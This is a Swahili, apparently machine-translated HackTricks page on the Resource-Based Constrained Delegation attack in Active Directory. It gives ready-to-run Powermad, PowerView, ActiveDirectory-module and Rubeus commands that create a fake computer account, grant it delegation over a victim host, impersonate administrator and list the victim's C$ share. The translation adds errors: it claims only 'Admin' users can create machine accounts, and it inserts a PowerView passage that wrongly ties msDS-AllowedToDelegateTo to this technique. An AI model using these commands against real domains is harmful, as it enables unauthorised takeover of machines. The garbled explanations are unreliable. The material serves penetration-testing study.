# Utekelezaji wa Kikomo cha Utekelezaji kwa Msingi wa Raslimali

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Misingi ya Kikomo cha Utekelezaji kwa Msingi wa Raslimali

Hii ni sawa na [Utekelezaji wa Kikomo](constrained-delegation.md) lakini **badala yake** ya kutoa ruhusa kwa **kitu** kuwa **wakilishi wa mtumiaji yeyote dhidi ya huduma**. Kikomo cha Utekelezaji kwa Msingi wa Raslimali **hukiweka** katika **kitu ni nani anayeweza kuwa wakilishi wa mtumiaji yeyote dhidi yake**.

Katika kesi hii, kitu kilichopunguzwa kitakuwa na sifa inayoitwa _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ na jina la mtumiaji ambaye anaweza kuwa wakilishi wa mtumiaji mwingine yeyote dhidi yake.

Tofauti muhimu nyingine kati ya Utekelezaji huu wa Kikomo na utekelezaji mwingine ni kwamba mtumiaji yeyote mwenye **ruhusa ya kuandika juu ya akaunti ya kompyuta** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/n.k_) anaweza kuweka _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Katika aina nyingine za Utekelezaji, unahitaji uwezo wa msimamizi wa kikoa).

### Dhana Mpya

Katika Utekelezaji wa Kikomo, ilisemwa kuwa bendera ya **`TrustedToAuthForDelegation`** ndani ya thamani ya _userAccountControl_ ya mtumiaji inahitajika kufanya **S4U2Self.** Lakini hiyo sio ukweli kamili.\
Ukweli ni kwamba hata bila thamani hiyo, unaweza kufanya **S4U2Self** dhidi ya mtumiaji yeyote ikiwa wewe ni **huduma** (una SPN) lakini, ikiwa una **`TrustedToAuthForDelegation`** TGS iliyorejeshwa itakuwa **inayoweza kupelekwa** na ikiwa **huna** bendera hiyo TGS iliyorejeshwa **haitakuwa** inayoweza kupelekwa.

Walakini, ikiwa **TGS** inayotumiwa katika **S4U2Proxy** **HAIWEZI kupelekwa** jaribio la kudukua **Utekelezaji wa Kikomo wa Kawaida** **halitafanya kazi**. Lakini ikiwa unajaribu kudukua **Utekelezaji wa Kikomo kwa Msingi wa Raslimali, itafanya kazi** (hii sio udhaifu, ni kipengele, kwa kuonekana).

### Muundo wa Shambulio

> Ikiwa una **ruhusa sawa na kuandika** juu ya akaunti ya **Kompyuta** unaweza kupata **upatikanaji wa haki** kwenye kompyuta hiyo.

Fikiria kuwa mshambuliaji tayari ana **ruhusa sawa na kuandika** juu ya kompyuta ya mwathirika.

1. Mshambuliaji **anadukua** akaunti ambayo ina **SPN** au **inaunda moja** ("Huduma A"). Kumbuka kwamba **mtumiaji yeyote** wa _Admin_ bila haki maalum nyingine yoyote anaweza **kuunda** hadi 10 **vitu vya Kompyuta (**_**MachineAccountQuota**_**)** na kuweka SPN. Kwa hivyo mshambuliaji anaweza tu kuunda kitu cha Kompyuta na kuweka SPN.
2. Mshambuliaji **anatumia ruhusa yake ya KUANDIKA** juu ya kompyuta ya mwathirika (HudumaB) kuwezesha **utekelezaji uliopunguzwa kwa msingi wa raslimali kuruhusu HudumaA kuwa wakilishi wa mtumiaji yeyote** dhidi ya kompyuta hiyo ya mwathirika (HudumaB).
3. Mshambuliaji anatumia Rubeus kufanya **shambulio kamili la S4U** (S4U2Self na S4U2Proxy) kutoka Huduma A kwenda Huduma B kwa mtumiaji **mwenye upatikanaji wa haki kwenye Huduma B**.
1. S4U2Self (kutoka akaunti iliyodukuliwa/iliyoundwa ya SPN): Uliza TGS ya **Msimamizi kwangu** (Isiyoweza kupelekwa).
2. S4U2Proxy: Tumia TGS **isiyoweza kupelekwa** ya hatua iliyotangulia kuomba TGS kutoka **Msimamizi** kwenda **mwenyeji wa mwathirika**.
3. Hata ikiwa unatumia TGS isiyoweza kupelekwa, kwa kuwa unatumia utekelezaji uliopunguzwa kwa msingi wa raslimali, itafanya kazi.
4. Mshambuliaji anaweza **kupitisha tiketi** na **kuwa wakilishi** wa mtumiaji ili kupata **upatikanaji wa HudumaB**.

Ili kuchunguza _**MachineAccountQuota**_ ya kikoa, unaweza kutumia:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Shambulizi

### Kuunda Kitu cha Kompyuta

Unaweza kuunda kitu cha kompyuta ndani ya kikoa kwa kutumia [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Kuwezesha Utekelezaji wa Rasilimali kwa Kizuizi

**Kutumia moduli ya PowerShell ya activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Kutumia powerview**

Powerview ni zana yenye nguvu ya PowerShell ambayo inaweza kutumiwa kuchunguza na kuchunguza mazingira ya Active Directory. Inatoa uwezo wa kufanya kazi na vipengele vya Active Directory kwa urahisi na kwa ufanisi.

Kwa kutumia Powerview, unaweza kutekeleza mbinu mbalimbali za kudhibiti rasilimali kwenye mfumo wa Active Directory. Hii ni pamoja na kutekeleza mbinu za kudhibiti rasilimali zilizopunguzwa (constrained delegation) ambazo zinaweza kusaidia katika kudhibiti ufikiaji wa rasilimali kwa watumiaji fulani.

Kwa kufuata hatua zifuatazo, unaweza kutumia Powerview kutekeleza mbinu za kudhibiti rasilimali zilizopunguzwa:

1. Tumia amri ya PowerShell `Import-Module .\PowerView.ps1` ili kuagiza Powerview.
2. Tumia amri ya PowerShell `Get-DomainUser -Identity <username>` ili kupata habari za mtumiaji wa kikoa.
3. Tumia amri ya PowerShell `Get-DomainComputer -Identity <computername>` ili kupata habari za kompyuta ya kikoa.
4. Tumia amri ya PowerShell `Set-DomainObject -Identity <object> -Add @{'msDS-AllowedToDelegateTo'="<target>"} -Verbose` ili kuwezesha kudhibiti rasilimali zilizopunguzwa kwa lengo fulani.

Kwa kufuata hatua hizi, unaweza kutumia Powerview kutekeleza mbinu za kudhibiti rasilimali zilizopunguzwa kwenye mfumo wa Active Directory. Hii inaweza kuwa na manufaa katika kudhibiti ufikiaji wa rasilimali kwa watumiaji wanaohusika.
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Kutekeleza shambulio kamili la S4U

Kwanza kabisa, tumeunda kitu kipya cha Kompyuta na nenosiri `123456`, hivyo tunahitaji hash ya nenosiri hilo:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Hii itaonyesha RC4 na AES hashes kwa akaunti hiyo.\
Sasa, shambulio linaweza kutekelezwa:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Unaweza kuzalisha tiketi zaidi kwa kuuliza mara moja tu kwa kutumia `/altservice` paramu ya Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Tafadhali kumbuka kuwa watumiaji wana sifa inayoitwa "**Haiwezi kupelekwa**". Ikiwa mtumiaji ana sifa hii kuwa ya kweli, hautaweza kujifanya kuwa yeye. Mali hii inaweza kuonekana ndani ya bloodhound.
{% endhint %}

### Kupata

Amri ya mwisho itatekeleza **shambulio kamili la S4U na kuingiza TGS** kutoka kwa Msimamizi kwenda kwa mwenyeji wa mwathirika katika **kumbukumbu**.\
Katika mfano huu, TGS ilihitajika kwa huduma ya **CIFS** kutoka kwa Msimamizi, kwa hivyo utaweza kupata **C$**:
```bash
ls \\victim.domain.local\C$
```
### Matumizi ya tiketi za huduma tofauti

Jifunze kuhusu [**tiketi za huduma zinazopatikana hapa**](silver-ticket.md#available-services).

## Makosa ya Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Hii inamaanisha kuwa Kerberos imeundwa kutokutumia DES au RC4 na unatoa tu hash ya RC4. Toa angalau hash ya AES256 kwa Rubeus (au toa tu hash za rc4, aes128, na aes256). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Hii inamaanisha kuwa wakati wa kompyuta ya sasa ni tofauti na wakati wa DC na Kerberos haifanyi kazi vizuri.
* **`preauth_failed`**: Hii inamaanisha kuwa jina la mtumiaji + hash zilizotolewa hazifanyi kazi kuingia. Huenda umesahau kuweka "$" ndani ya jina la mtumiaji wakati wa kuzalisha hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Hii inaweza maana:
* Mtumiaji unayejaribu kujifanya hawezi kupata huduma inayotakiwa (kwa sababu huwezi kujifanya au kwa sababu haina vya kutosha)
* Huduma iliyoombwa haipo (ikiwa unauliza tiketi kwa winrm lakini winrm haifanyi kazi)
* Kompyuta bandia iliyoundwa imepoteza mamlaka yake juu ya seva inayoweza kudhurika na unahitaji kuirudisha.

## Marejeo

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
